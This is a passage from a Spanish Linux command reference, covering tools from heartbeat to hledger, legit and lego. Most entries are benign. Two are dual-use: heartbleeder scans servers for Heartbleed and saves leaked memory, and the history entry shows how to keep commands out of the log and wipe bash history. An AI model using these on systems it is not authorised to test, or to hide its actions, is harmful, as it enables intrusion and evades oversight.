La interfaz gráfica permitirá ver:
- Una lista de todas las asignaciones de memoria y liberaciones.
- Información detallada sobre cada asignación, incluyendo el tamaño y la ubicación en el código.
- Gráficos que muestran el uso de la memoria a lo largo del tiempo.
- Información sobre posibles fugas de memoria.


heartbeat
Es un subsistema de mensajería para alta disponibilidad [HA] que implementa latidos via serie, UDP o PPP/UDP y permite que múltiples nodos [servidores] trabajen juntos para proporcionar servicios que se mantengan disponibles incluso si uno de los nodos falla. Incluye las aplicaciones cl_respawn y cl_status.
Ejemplo simple de configuración
# nano /etc/ha.d/ha.cf
        logfacility local0
        keepalive 2
        deadtime 10
        warntime 5
        initdead 20
        udpport 694
        bcast eth0
        node nodo1
        node nodo2
Define: Intervalos de heartbeat [keepalive], cuánto esperar antes de declarar a un nodo muerto [deadtime], interfaz de red usada [bcast eth0], nombres de los nodos participantes [node1, nodo2, etc]
$ cl_status listnodes (consulta el estado actual del clúster y sus recursos)
$ cl_status nodestatus nodo1 (muestra los nodos activos del clúster)
$ cl_status listresources (lista los recursos que está gestionando)
$ cl_status resource_status recurso1 (verifica el estado del recurso recurso1)
$ cl_respawn /usr/sbin/httpd -DFOREGROUND (lanza Apache y se asegura de que si el proceso muere, se reinicie automáticamente)


heartbleeder
Herramienta de prueba de vulnerabilidades que verifica si un servidor remoto es vulnerable al famoso bug Heartbleed [CVE-2014-0160] en OpenSSL [versiones 1.0.1 a 1.0.1f]. Este fallo de seguridad permitía a un atacante leer partes de la memoria del servidor, exponiendo información sensible como claves privadas, contraseñas y otros datos.
$ heartbleeder example.com (comprobar un servidor web)
$ heartbleeder -p 8443 example.com (probar un puerto. Por defecto el 443)
$ heartbleeder -v -f output.bin example.com (mostrará más detalles y guardar datos extraídos en un archivo)
Nota.- La mayoría de los servidores están parcheados o las versones de OpenSSL son 1.0.1g o superior.


heat-api
[heat-api-cfn heat-engine python-heat-client]. Es un servicio para orquestar múltiples aplicaciones compuestas en la nube mediante plantillas, a través de una API ReST nativa de OpenStack y una API de consulta compatible con CloudFormation.
Ejemplo sencillo de una plantilla
$ nano mi_plantilla.yaml
        heat_template_version: 2018-03-02
        description: Simple template to deploy a single instance
        parameters:
          key_name:
            type: string
            description: Name of key-pair to be used for compute instance
          image_id:
            type: string
            description: Image to be used for compute instance
          instance_type:
            type: string
            description: Type of instance (flavor) to be used
          network_name:
            type: string
            description: The network to be used
        resources:
          my_instance:
            type: OS::Nova::Server
            properties:
              key_name: { get_param: key_name }
              image: { get_param: image_id }
              flavor: { get_param: instance_type }
              networks:
                - network: { get_param: network_name }
# service heat-api restart (reiniciar el servicio)
Estas acciones se comunican con el servicio heat-api, que a su vez se coordina con el motor de orquestación para realizar las operaciones solicitadas.
$ openstack stack create -t mi_plantilla.yaml --parameter key_name=mi_llave --parameter image_id=mi_imagen --parameter instance_type=m1.small --parameter network_name=mi_red mi_stack (crea una pila que despliega los recursos definidos en la plantilla)
$ openstack stack list (consultar el estado de las pilas)
$ openstack stack show mi_stack (consultar el estado de mi plantilla)


hegemon
[libsensors4-dev cargo]. Monitoreo del sistema: Velocidad del ventilado, temperatura, CPU, memoria y uso de swap. El intervalo de monitorización es 3 segundos. Al estar escrito en lenguaje RUST, una vez instñalado:
$ cargo install hegemon
Puede requerir incluir la ruta de los ejecutables que usa RUST en el patch:
$ export PATH="$HOME/.cargo/bin:$PATH"
Para ejecutarlo:
$ hegemon


hellfire
Herramienta diseñada principalmente para la resolución DNS masiva y paralelizada. Su objetivo principal es generar listas de dominios para ser utilizadas por otras herramientas, como PATHspider [herramienta que se utiliza para realizar mediciones de red y analizar rutas de tráfico]. En esencia, actúa como un potente escáner DNS que puede procesar un gran número de consultas de forma eficiente.
Crear el archivo CSV con una lista de dominios y l mismo contenido para dominios.txt:
$ nano dominios.csv
domain
google.com
facebook.com
openai.com
x.com
nic.cl
Asegurar que la primera fila sea el encabezado del.csv, en este caso "domain", en el .txt no es necesario.
$ hellfire --topsites --type=host --output=individual (usa lista de sitios populares, hace resolución de tipo host [registro A] e imprime un objeto JSON por dominio)
$ hellfire --csv --file=mis-dominios.csv --type=mx --output=array (usa archivo CSV con dominios, obtiene registros MX y muestra la salida como un único JSON tipo array)
$ hellfire --csv --file=dominios.csv
$ hellfire --opendns --list=adult-content --type=host --output=individual (usa lista temática de OpenDNS, busca registros A/AAAA y salida como JSON por dominio)
$ hellfire --citizenlab --country=cn --type=ns --output=oneeach (descarga/usa lista de Citizen Lab para China, resuelve registros NS y muestra un resultado por línea, uno por dominio)
$ hellfire --csv --file=dominios.csv --type=host --canid=10.0.0.1 --output=array (usa lista.csv, realiza resoluciones usando 10.0.0.1 como servidor DNS y muestra resultados en formato array)
$ hellfire --csv --file=dominios.csv --type=ns --output=array --canid=127.0.0.1
$ hellfire --opendns --file=dominios.txt --type=host --output=individual --rate=5 (limitando las consultas a 5 por segundo)
$ hellfire --citizenlab --country=ES (resolver dominios de Citizen Lab para un país específico)


hello
Muestra el clásico "hello, world" o un saludo personalizable.
$ hello -t (El tradicional "hello, world")
$ hello -g "Linux es un sistema genial" (Muestra la frase)


help
Muestra los comandos disponibles en bash. Estos comandos no tienen página man, por lo que para acceder a una descripción se usa esta opción.
$ help
$ help fc


help2man
Programa para crear páginas man simples a partir de la salida --help y --version de un programa.
$ help2man --no-discard-stderr script.sh (incluir la salida stderr del script al analizar la salida de la opción)


helpviewer
Es un visor de ayuda en línea para programas GNUstep. Su función principal es mostrar documentación en formato XLP [XML Help], aunque este formato está obsoleto y su uso es limitado en sistemas modernos ya que la mayoría de las aplicaciones usan formatos como HTML, Markdown o man pages.
$ apt rdepends helpviewer (buscar paquetes que dependan de él)
$ helpviewer Manual.xlp (abrir un archivo de ayuda en formato XLP)


helpztags
Escanea directorios dados en busca de archivos *.txt y *.txt.gz. Cada archivo es escaneado para encontrar etiquetas utilizadas en los archivos de ayuda de vim. Para cada directorio se genera un archivo de etiquetas adecuado.
$ helpztags Documents/*


heroku
Gestión de los blogs alojados en <http://www.heroku.com> Ver octopress 17.
$ heroku apps:rename nuevo_nombre --app viejo_nombre(Renombrar un blog. Si se hace en la web en algunos casos da problemas)
$ heroku addons (Ver los addons instalados)
$ heroku apps (Muestra los blogs alojados)
$ heroku login (Logearse con el nombre de usuario y contraseña de registro)
$ heroku create (Crea el repositorio en el directorio actual)
$ heroku logs (Muestra los logs)
$ heroku ps (Ver las aplicaciones corriendo en heroku)
$ heroku restart web.1 (Reiniciar la aplicación a aprtir del dato obtenido com ps)
$ heroku apps:destroy mighty-fortress-6385 (Eliminar una app)
$ heroku sharing --app tractatuslapipaplena (Ver los colaboradores de un proyecto)
$ heroku auth:login (Pide los datos de registro)
$ heroku keys:add ~/.ssh/id_rsa.pub (Subir la clave publica)
$ heroku git:remote -a tractatuslapipaplena (Añadir una aplicación Heroku con control remoto Git)


hexcompare
Es una utilidad basada en curses que permite comparar e identificar diferencias entre dos archivos binarios. Estas diferencias se representan visualmente mediante un diagrama de bloques interactivo.
$ hexcompare archivo1.bin archivo2.bin (abre una interfaz interactiva donde se muestran las diferencias entre los dos archivos binarios)
$ hexcompare -x archivo1.bin archivo2.bin (compara los archivos y muestra el contenido en formato hexadecimal)
$ hexcompare -t 1024 archivo1.bin archivo2.bin (ignora diferencias menores a 1024 bytes, útil para archivos grandes con pequeñas variaciones)
Atajos útiles en la interfaz:
        F1 o ? --> Muestra ayuda.
        Tab --> Cambia entre los paneles de los dos archivos.
        Enter --> Salta a la siguiente diferencia.
        Q --> Sale del programa.


hexdump
[exedit]. Editor de archivos binarios.
$ hexdump -C archivo_binario


hexedit
Visor y editor en hexadecimal o ASCII para archivos o dispositivos como discos duros, particiones, unidades flash, etc. También cuenta con funciones para copiar y pegar, y guardar en archivo y realizar tareas como la reparación de archivos binarios, búsqueda de cadenas, o edición de sectores en discos.
$ hexedit archivo.bin (abre archivo.bin. A la izquierda las direcciones, en el centro los bytes hexadecimales y a la derecha los caracteres ASCII correspondientes.)
Una vez abierto, las flechas para moverse, Tab para cambiar entre la vista hexadecimal y ASCII, Ctrl+x para salir y eligir si guardar los cambios, Ctrl+s para buscar texto ASCII y Ctrl+w para buscar una secuencia hexadecimal.
# hexedit /dev/sdb1 (ver o editar directamente una partición)
Nota.- No tiene función de deshacer. Cada cambio es permanente al guardar.


hexer
es un editor binario interactivo, también conocido como editor hexadecimal, con una interfaz similar a la de Vim. Sus características más importantes son múltiples búferes, deshacer multinivel, edición desde la línea de comandos con autocompletado y expresiones regulares binarias.
$ hexer archivo.bin (abre archivo.bin en modo interactivo en dos columnas: a la izquierda, los valores hexadecimales; a la derecha, la representación ASCII)
Moverse por el archivo
        j, k, h, l --> moverse como en vi
        G --> ir al final
        gg --> ir al principio
        :0x10A --> ir a una dirección específica, en decimal o hexadecimal
        i --> entrar en modo inserción
        :w --> guarda el archivo
        :q --> salir
        :wq --> guardar y salir


hexyl
Visor hexadecimal que utiliza la salida en color para distinguir diferentes categorías de bytes: bytes nulos, caracteres ASCII imprimibles, espacios en blanco ASCII, otros caracteres ASCII y no ASCII.
$ echo "Hola mundo" | hexyl (analizar entrada estándar)
$ hexyl (abrirá una ventana interactiva donde se podrá ingresar texto o datos binarios para ser analizados en formato hexadecimal)
$ hexyl < archivo.bin (visualizar un archivo binario)
$ hexyl /dev/sda (lectura del primer sector de un disco duro
$ hexyl -d archivo1.bin archivo2.bin (comparar dos archivos)
$ hexyl -n 64kB archivo.txt (solo se leen 64 bytes de la entrada. El argumento también puede incluir una unidad con prefijo decimal [kB, MB, etc.] o binario [kiB, MiB, etc.])


hey
Herramienta escrita en Go, que se utiliza para generar carga HTTP con el fin de realizar pruebas de rendimiento o benchmarking de servicios web. Sirve para evaluar cuántas peticiones por segundo puede manejar un servidor, simular múltiples usuarios simultáneos haciendo peticiones HTTP y probar cómo reacciona una API o página web bajo carga.
$ hey -n 200 -c 20 https://example.com (número total de peticiones a realizar con hasta 20 de ellas ejecutándose al mismo tiempo y la URL objetivo)
$ hey -n 100 -c 10 -m POST -H "Content-Type: application/json" -d '{"username":"test","password":"1234"}' https://example.com/api/login
        -m POST --> especifica el método HTTP.
        -H --> cabecera HTTP.
        -d --> cuerpo del mensaje.
$ hey -n 100 -c 10 -m PUT -H "Content-Type: application/json" -d '{"name":"new name"}' https://example.com/api/item/1 (cambiar el método a PUT)
$ hey -n 50 -c 5 -H "Authorization: Bearer <token>" https://api.example.com/protected (añadir cabeceras de autorización)


hfd-service
[Human Feedback Device Service]. Servicio D-Bus del sistema para acceder a dispositivos de retroalimentación humana. El servicio de dispositivos de retroalimentación humana es un servicio activado por D-Bus que gestiona dispositivos como LED y vibradores en dispositivos móviles tales como teléfonos, tablets, etc..
# systemctl status hfd-service (verificar su estado)
$ dbus-send --system --dest=org.sailfishos.hfd --type=method_call /org/sailfishos/hfd org.sailfishos.hfd.Vibrator.Vibrate uint32:1000 (duración de la vibración. 1000 ms = 1 segundo)
$ dbus-send --system --dest=org.sailfishos.hfd --type=method_call /org/sailfishos/hfd org.sailfishos.hfd.Led.SetPattern string:"notification" uint32:5000  (controlar un LED)
$ dbus-monitor --system "interface=org.sailfishos.hfd" (ver mensajes de D-Bus)
$ journalctl -u hfd-service -f (ver logs del servicio)


hfsplus
Herramientas para acceder a volúmenes formateados HFS+ también conocido como "Mac OS Extended". HFS+ es una versión modernizada del sistema de archivos HFS de Apple que se usa ampliamente en versiones más recientes de macOS. A diferencia de las antiguas hfsutils, para el formato HFS, las herramientas hfsplus utilizan la sintaxis de rutas de estilo Unix, con "/" como delimitador en lugar de la sintaxis de Mac con ":". Incluye las herramientas hpcd, hpcopy, hpfsck, hpls, hpmkdir, hpmount, hppwd, hprm y hpumount
# hpmount /dev/sdb1 /media/mac_disk (montar el dispositivo /dev/sdb1)
# hpcd /media/mac_disk/Users/mi_usuario/Documents (cambiar al directorio Documents dentro del volumen montado)
# hpcopy mi_documento.txt /media/mac_disk/Users/mi_usuario/Documents/ (copiar un archivo de Linux al volumen HFS+)
# hpcopy /media/mac_disk/Photos/vacaciones.jpg . (copiar un archivo del volumen HFS+ al directorio actual en Linux)
# hpcopy -r /media/mac_disk/Projects/ MyLinuxProjects/ (copiar un directorio entero)
# hpfsck /dev/sdb1 (verificar el sistema de archivos HFS+ en /dev/sdb1. El volumen NO debe estar montado)
# hpls /media/mac_disk/ (listar el contenido del directorio raíz del volumen HFS+)
# hpls -l /media/mac_disk/Users/mi_usuario/Desktop/ (listar el contenido de un subdirectorio con detalles)
# hpmkdir /media/mac_disk/Backups (crear un nuevo directorio)
# hppwd (muestra el directorio de trabajo actual dentro del volumen HFS+)
# hprm /media/mac_disk/Temporal/archivo_viejo.txt (eliminar un archivo)
# hprm -r /media/mac_disk/Unused_Folder/ (eliminar un directorio y su contenido de forma recursiva)
# hpumount /media/mac_disk (desmontar el volumen HFS+)
Nota.- Generalmente se pueden usar las herramientas estándar de Linux [cd, mkdir, rm, ls, mv, ...] con el dispositivo montado.


hfsprogs
mkfs y fsck para sistemas de archivos HFS y HFS+ [desmontados]. Incluye las herramientas fsck.hfs, fsck.hfsplus, mkfs.hfs y mkfs.hfsplus
# fsck.hfs -f /dev/sdb1 (verificar y reparar un volumen HFS en /dev/sdb1)
# fsck.hfsplus -y -f /dev/sdb1 (verificar y reparar un volumen HFS+ en /dev/sdb1 asumientyo "si" a todas las preguntas)
# fsck.hfsplus -n -f /dev/sdb1 (asumir "no" a todas las preguntas de reparación. Solo simular la verificación, no hacer cambios)
# mkfs.hfs -v OLD_MAC_DISK /dev/sdc1 (crear un volumen HFS llamado "OLD_MAC_DISK" en /dev/sdc1)
# mkfs.hfsplus -J -v My_Mac_Drive /dev/sdd1 (crear un volumen HFS+ con journaling y nombre "My_Mac_Drive")


hfsutils
Este paquete contiene varias utilidades para leer y escribir en medios con formato HFS [Hierarchical File System] de Macintosh, como disquetes, CD-ROM y discos duros. Incluye las herramientas hattrib, hcd, hcopy, hdel, hdir, hformat, hls, hmkdir, hmount, hpwd, hrename, hrmdir, humount y hvol.
$ hattrib -t TEXT -c BNHQ "Nuevo disco:Archivo.sea.hqx" (asigna el tipo TEXT y el creador BNHQ al archivo especificado en el volumen HFS)
$ hcd "Carpeta de Documentos" (mueve el directorio de trabajo al especificado dentro del volumen HFS)
$ hcopy archivo.txt "Desktop Folder" (copiar un archivo local al disco HFS)
$ hcopy "Desktop Folder:Readme" . (copiar un archivo desde el disco HFS al sistema local)
$ hdel "Desktop Folder:Readme" (borra el archivo "Readme" de la carpeta de escritorio del volumen HFS)
$ hdir "Desktop Folder" (muestra detalles de los archivos, incluyendo tamaño, tipo y creador)
$ hformat /dev/fd0 (formatear un disquete como HFS)
$ hls "Desktop Folder" (lista archivos en un directorio HFS)
$ hmkdir "Nuevos Documentos" (crea la carpeta en el directorio actual)
$ hmount /dev/fd0 (monta el disquete HFS en `/dev/fd0` para usarlo con otras utilidades hfsutils)
$ hpwd (devuelve la ruta actual dentro del volumen HFS)
$ hrename "Desktop Folder:Viejo.txt" "Desktop Folder:Nuevo.txt" (renombra el archivo "Viejo.txt" a "Nuevo.txt")
$ hrmdir "CarpetaVacia" (elimina la carpeta especificada si está vacía)
$ humount (Desmonta el volumen HFS actual)
$ hvol (muestra el nombre del volumen actual)
1.-
Crear una imagen HFS de 800K y formatearla
$ dd if=/dev/zero of=disk.hfs bs=1k count=800
$ hformat -l "Test Disk" disk.hfs


hg
[mercurial]. Mercurial es un potente programa de control de versiones para nuestros proyectos. Previamente crear en la carpeta personal, el archivo:
$ nano .hgrc
Con el siguiente contenido:
	[ui]
	username = Juanito Perez juanitoperez@gmail.com
$ hg init repositorio . (crea un repositorio en el directorio actual o en el que se especifique)
$ hg add  (añade los ficheros existentes en el directorio a nuestro proyecto)
$ hg clone http://servidor.com/hg (clona un repositorio a la carpeta actual)
$ hg clone ssh://usuario@servidor.com/carpeta repositorio (clona "carpeta" usando ssh en el directorio "repositorio" del directorio actual)
$ hg status (muestra el estado de los ficheros del proyecto)
$ hg commit (realizamos un commit al proyecto)
$ hg push (enviamos los cambios al repositorio remoto)
$ hg pull (recuperamos cambios del repositorio)
$ hg update (Recargar los archivos despues de un pull)
$ hg update -C (Mezclar cambios [merge])
$ hg log (vemos todos los cambios realizados en el proyecto)
$ hg log -r 5 (Muestra la 5ª revisión)
$ hg log -r 2:5 (Muestra de las 2ª a la 5ª revisión)
$ hg log -p -r 6 (Muestra todas las modificaciónes del archivo de la 6ª revisión)
$ hg tip -v (Muestra los datos de la última revisión)
$ hg help comando (vemos la ayuda integrada del hg para el comando)


hidd
Gestionar dispositivos blueetoth
# hidd --search (Buscar dispositivos)
# hidd --connect 0A:1B:2C:4D:5E:6F (Conectar a un dispositivo)


hiera
Herramienta de búsqueda de datos jerárquicos que se utiliza comúnmente en entornos de automatización y gestión de configuración, como Puppet o Ansible.
Crear el archivo de configuración:
# nano hiera.yaml
:backends:
  - yaml
:hierarchy:
  - "nodes/%{::hostname}"
  - "common"
:yaml:
  :datadir: /etc/hiera/data
En este ejemplo, hiera buscará datos en archivos YAML ubicados en /etc/hiera/data. La jerarquía tiene dos niveles: nodes/hostname y common.
Crear el directorio /etc/hiera/data/nodes y un archivo YAML para un nodo específico
# cd /etc/hiera/data/nodes
# nano mihost.example.com.yaml:
users:
  - usuario1
  - usuario2
También crear un archivo common.yaml en /etc/hiera/data para datos comunes:
# cd /etc/hiera/data
# nano common.yaml
ntp_server: "ntp.example.com"
$ hiera -c /etc/hiera/hiera.yaml users hostname=mihost.example.com (buscar el valor de users para un host específico)
$ hiera -c /etc/hiera/hiera.yaml ntp_server (buscar el valor de ntp_server)


highlight
Herramienta para convertir código fuente a diferentes formatos con resaltado de sintaxis, tales como HTML, XHTML, RTF, LaTeX, TeX, SVG, XML.
$ highlight --list-themes (listar temas disponibles)
$ highlight -O html -i script.py -o script.html (convertir un archivo Python a HTML)
$ highlight -O html -s molokai -l script.py -o script.html (usar tema específico)
$ highlight -O html -l -i script.py -o script.html (con numeración de líneas)
$ highlight -O html -s github -i script.py -o script.html (especificar tema de colores)
$ highlight -O ansi script.py (generar salida para terminal con colores)
$ highlight -O html -l -t 4 --doc-title "Mi Script Python" -i mi_script.py -o mi_script.html (generar HTML con título y numeración y sustituir tabulaciones con 4 espacios)
$ highlight -A titulo script.py (generar salida ansi que es el formato por defecto con un titulo)
$ highlight -O latex -i codigo.cpp -o codigo.tex (convertir a LaTeX)
$ highlight -O latex -l -i codigo.cpp -o codigo.tex (con numeración de líneas)
$ highlight -O rtf -i programa.java -o programa.rtf (generar RTF [Rich Text Format] para documentos de Word u otros procesadores)
$ highlight -O svg -i script.js -o script.svg (generar imagen vectorial del código)
$ highlight -O latex -l -s print -t 2 codigo.c -o codigo.tex (generar LaTeX con formato específico)


hiki
Es un clon de WikiWiki Web escrito en Ruby que permite configurar un servidor de wiki local o en un servidor web. Es una herramienta de colaboración que permite a los usuarios crear y editar páginas de manera sencilla y ofrece una sintaxis similar a la de los wikis originales, soporte para temas mediante CSS, funcionalidades extendidas a través de complementos [plugins], soporte para InterWiki, y categorización de páginas. Hiki no es compatible con Ruby a partir de la versión 3.3. El proyecto no parece estar activamente mantenido desde 2013.
Configurar el servidor web
Hiki funciona como un script CGI, por lo que se necesita un servidor web como Apache configurado para ejecutar scripts CGI.
# a2enmod cgi (habilitar el módulo)
Configurar Hiki:
# mkdir /var/www/hiki (crear un directorio para los datos del wiki)
# cp -r /usr/share/hiki/* /var/www/html/hiki/
# chown -R www-data:www-data /var/www/html/hiki
# nano /var/www/hiki/html/hikiconf.rb
        @site_name = 'Mi Wiki'
        @data_path = '/var/www/html/hiki/data'
        @theme = 'hiki'
        @charset = 'UTF-8'
        @use_plugin = true
Configurar Apache:
# nano /etc/apache2/sites-available/hiki.conf
<VirtualHost *:80>
    ServerName wiki.ejemplo.com
    DocumentRoot /var/www/html/hiki
    <Directory /var/www/html/hiki>
        Options +ExecCGI
        AddHandler cgi-script .cgi
        AllowOverride All
        Require all granted
    </Directory>
</VirtualHost>
a2ensite hiki (habilitar el sitio)
systemctl restart apache2 (reiniciar apache)
Acceder al wiki con el navegador http://localhost/hiki.cgi
Para cambiar el tema, descargar un tema de tDiary desde http://www.tdiary.net/theme.rhtml y colocarlo en /var/www/html/hiki/theme
# nano /var/www/hiki/html/hikiconf.rb
   @theme = 'nombre_del_tema'
   @theme_path = '/var/www/html/hiki/theme'
# systemctl restart apache2 (reinicia el servidor web)


hinawa-utils
Utilidades para controlar unidades de audio y música en FireWire (IEEE1394). hinawa-utils son Herramientas para interactuar con dispositivos de audio y música a través de FireWire (IEEE1394) y contienen las siguientes herramientas: hinawa-bebob-parser, hinawa-config-rom-printer, hinawa-dg00x-cui, hinawa-dice-common-cui, hinawa-dice-extension-cui, hinawa-fireworks-cui, hinawa-focusrite-saffirepro-io-cui, hinawa-griffin-firewave-cui, hinawa-lacie-speakers-cui, hinawa-maudio-bebob-cui, hinawa-motu-common-cui, hinawa-oxfw-generic-cui, hinawa-tascam-fireone-cui, hinawa-tascam-fw-console-cui, hinawa-tascam-fw-rack-cui y hinawa-yamaha-terratec-cui.
$ hinawa-bebob-parser /dev/fw1 (muestra detalles como modelos compatibles, capacidades de audio, formatos soportados, etc)
$ hinawa-config-rom-printer /dev/fw1 (muestra información como vendor ID y Model ID)
$ hinawa-dice-rtd-transaction /dev/fw1 read 0xffff00000000 4 (lee 4 bytes desde la dirección 0xffff00000000)
$ hinawa-dice-rtd-transaction /dev/fw1 write 0xffff00000000 0x12345678 (escribe el valor 0x12345678 en la dirección especificada)
$ hinawa-dice-parser /dev/fw1 (muestra detalles como número de canales de entrada/salida, formatos de audio soportados [PCM, MIDI] y configuración de clock)
$ hinawa-fireface-rmh-command /dev/fw1 get-status (muestra el estado actual del dispositivo [sample rate, modo de clock, etc.])
$ hinawa-fireface-rmh-parser /dev/fw1 (analiza la información de dispositivos RME FireFace)
$ hinawa-fireworks-command /dev/fw1 reset (reinicia el dispositivo)
$ hinawa-fireworks-parser /dev/fw1 (analiza dispositivos Echo AudioFire)
$ hinawa-motu-command /dev/fw1 set-sample-rate 48000 (envía comandos a dispositivos **MOTU** [ej. MOTU 828/896])
$ hinawa-motu-parser /dev/fw1 (analiza dispositivos MOTU)
$ dmesg | grep firewire (asegurar que el kernel detecte el dispositivo)


hipercontracer
[High-Performance Connectivity Tracer]. Herramienta utilizada para realizar pruebas de conectividad de red, específicamente pings y traceroutes, entre diferentes sitios y puede exportar los resultados a una base de datos SQL o no SQL. Inlcuye las herramientas addressinfogenerator, get-default-ips y tracedataimporter
# hipercontracer -U hipercontracer -S 0.0.0.0 -D 8.8.8.8 -P -v (usuario, origen, destino, lanzar ping y máxima información)
# hipercontracer -S 127.0.0.1 -D 142.251.37.163 -T --tracerouteinterval 10000 --tracerouteduration 1000 -v (dirección de origen, destino [google.es], realizar traceroute con intervalos de 10000 milisegundos y una duración de 1000 milisegundos con la máxima información)
# hipercontracer -S 0.0.0.0,AF12 -D 142.251.37.163 -T --tracerouteinterval 10000 --tracerouteduration 1000 -v (especificar una clase de tráfico por nombre de PHB [BE, EF, AF11, AF12, AF13, AF21...])
# hipercontracer -S 0.0.0.0 -D 142.251.37.163  -T -P --tracerouteduration 1000 --tracerouteinitialmaxttl 4 --traceroutefinalmaxttl 32 --tracerouteincrementmaxttl 4 --pinginterval 1000 --pingexpiration 7500 --pingttl 56 --resultsdirectory results (guardando el resultado en el diectorio "results")
Nota.- TTL [Time To Live - Tiempo de Vida]. Cantidad de "saltos" que un paquete rebota entre diferentes enrutadores o cuánto tiempo los datos en forma de paquete son válidos y están disponibles dentro de una red antes de que el enrutador los borre.


hipstopgm
[Netpbm]. Lee un archivo HIPS [Human Information Processing Laboratory] como entrada y produce una imagen PGM como salida. Si el archivo HIPS contiene más de una imagen se concatenará todas las imágenes verticalmente.
$ hipstopgm archivo_de_hips


hishrink
Convierte un archivo ASCII HINT, generalmente con la extensión .hint, en un archivo binario HINT, con la extensión .hnt. El formato de archivo HINT basado en ASCII, también llamado formato 'largo', está optimizado para facilitar la lectura. Se puede editar con un editor de texto. Por lo tanto, permite modificaciones simples que serían difíciles de lograr utilizando el formato binario. También es conveniente al depurar. El formato de archivo binario HINT, también llamado formato 'corto', está optimizado para mostrar archivos HINT. El formato de archivo HINT binario está diseñado para la lectura en pantalla de documentos.


history
Lista los comandos utilizados por el usuario.
$ history 20 (lista los últimos 20)
$ history -c (elimina el historial de la memoria)
$ history -c ; history -w (limpieza definitiva)
$ history -d 125 ; history -w (eliminar la orden 125 y guardar cambios, útil si se escribió la contraseña y esta queda visible en el historial)
$ history -d 100-125 (eliminar las ordenes de la 100 a la 125. Para guardar los cambios los cambios lanzar despues siempre: history -w)
$ history | awk '{print $2}' | sort | uniq -c | sort -rn | head -10 (lista los 10 comandos más usados y numero de veces)
$ !354  (ejecutará el comando 354 del listado de history)
$ !354:p (lo mostrará sin ejecutarlo)
$ !ls (ejecutará el último "ls" del historial)
$ !ls:p (lo mostrará sin ejecutar)
$ !! (ejecuta el último comando del historial)
$ history | grep cp  (Buscar en el historial las veces que se ha lanzado “cp”)
$ history -a (Guardar el historial sin cerrar la sesión)
$ echo $HISTCMD (número de comandos registrados en history y este tambien queda reflejado en history)
$ history -d $HISTCMD && ip a (ejecuta "ip a" pero no se muestra en el historial)
$ ip a # un comentario (en history aparecerá "ip a # un comentario")
$ echo "" > ~/.bash_history && history -c (borrar el historial completo)
1.-
Borrar el historial automáticamente al cerrar la sesión de terminal
$ nano ~/.bash_logout
Y colocar al comienzo del archivo la linea:
        echo "" > ~/.bash_history && history -c
2.-
Pulsando Ctrl-r se entra en el historial y entrando el concepto a buscar salen todas las opciones. Con las flechas se baja a la deseada y pulsar "intro" para ejecutarla. Ctrl-g para salir de las busquedas y "Esc" para editar el comando encontrado.


histretch
Traducción de archivos HINT binarios a archivos ASCII. La inversa de los que hace el comando hishrink [ver]


hitch
Proxy de terminación SSL/TLS. Su función principal es desencriptar el tráfico HTTPS antes de pasarlo a los servidores backend en HTTP plano [sin cifrar]. Hitch se coloca delante de un servidor web como Nginx, Apache, Varnish, etc. El cliente [el navegador], se conecta a Hitch usando HTTPS y Hitch termina la conexión TLS, y luego reenvía el tráfico desencriptado al servidor backend mediante HTTP.
Configuración básica
# nano /etc/hitch/hitch.conf
        frontend = "[0.0.0.0]:443"
        backend = "[127.0.0.1]:8080"
        pem-file = "/etc/hitch/certs/mi_certificado.pem"
frontend --> donde Hitch escucha [puerto 443 en todas las interfaces].
backend --> servidor backend, en este caso un servidor HTTP en localhost:8080.
pem-file --> es el archivo que contiene el certificado y clave privada.
Nota.- El archivo .pem debe tener certificado y clave en el mismo archivo
1.-
Ejemplo de uso real
Suponiendo que  se tiene una aplicación en Flask que escucha en localhost:5000. Para ofrecer HTTPS: Generar o conseguir un certificado SSL y guardar el certificado y la clave en el archivo .pem
En el archivo de configuración:
# nano /etc/hitch/hitch.conf
        frontend = "[0.0.0.0]:443"
        backend = "[127.0.0.1]:5000"
        pem-file = "/etc/hitch/certs/flask_app.pem"
        write-proxy-v2 = on
write-proxy-v2 = on --> Usa el protocolo PROXY v2 para que el backend sepa la IP real del cliente.
# systemctl restart hitch (reinicia el servicio)
Ahora la aplicación está accesible en HTTPS a través del puerto 443, aunque internamente sigue trabajando en HTTP.


hledger
Herramienta de contabilidad que permite registrar y analizar transacciones financieras de manera sencilla y práctica para el uso diario. Funciona con archivos de texto plano, generalmente con extensión .journal o .ledge, donde se define cuentas y transacciones en un formato específico.
Ejemplo básico de un archivo finanzas.journal
$ nano finanzas.journal
        2024-01-01 Salario
            activos:banco:cuenta_corriente    +1000 €
            ingresos:salario
        #
        2024-01-02 Supermercado
            gastos:comida                     50 €
            activos:banco:cuenta_corriente
        #
        2024-01-03 Alquiler
            gastos:vivienda:alquiler          400 €
            activos:banco:cuenta_corriente
$ hledger -f finanzas.journal register (mostrar todas las transacciones)
$ hledger -f finanzas.journal balance (mostrar el balance general)
$ hledger -f finanzas.journal balance gastos (filtrar por cuenta, ej. solo gastos)
$ hledger -f finanzas.journal register --monthly -p "2024-01" (ver transacciones de un mes específico)
$ hledger -f finanzas.journal csv > transacciones.csv (exportar a CSV)
$ hledger -f finanzas.journal income --tree (mostrar un resumen por categoría)
$ hledger -f finanzas.journal stats (estado general)
$ hledger -f finanzas.journal accounts (muestra todas las cuentas)
$ hledger -f finanzas.journal descriptions (todas las descripciones a continuación de la fecha)
$ hledger -f finanzas.journal commodities (muestra la unidad en la que se cuenta [euros])
$ hledger -f finanzas.journal activity (muestra los dias del mes que hay actividad)
$ hledger -f finanzas.journal areg alquiler (ver un concepto)
$ hledger -f finanzas.journal print (mostrar todas las entradas completas)


ledger-web
Ver ledger y hledger
$ hledger-web -f finanzas.journal (muestra las finanzas en el navegador predeterminado)


legit
Extensión de Git para facilitar la manipulación de ramas al proporcionar varios comandos que ayudan a automatizar ciertas tareas con Git: cambio de rama fluido, sincronización del repositorio, creación y fusión de ramas y manipulación de ramas remotas.
$ legit sync (sincroniza todas las ramas locales con sus equivalentes remotas, haciendo pull y push automáticamente)
$ legit switch nombre_rama (cambia de una rama a otra, guardando automáticamente cambios sin commitear y restaurándolos al cambiar de rama)
$ legit publish nombre_rama (sube una rama local al repositorio remoto y la configura para seguimiento)
$ legit unpublish nombre_rama (elimina una rama remota y la desvincula de la local)
$ legit graft rama_origen rama_destino (fusiona los cambios de una rama en otra de manera sencilla)
$ legit new feature-y (crear nueva rama)
$ legit publish feature-y (publicarla en el remoto)


lego
Cliente Let's Encrypt escrito en Go. Su función principal es solicitar, renovar y gestionar certificados TLS/SSL gratuitos para tus dominios para que el servidor web [Apache, Nginx, etc.] para activar HTTPS.
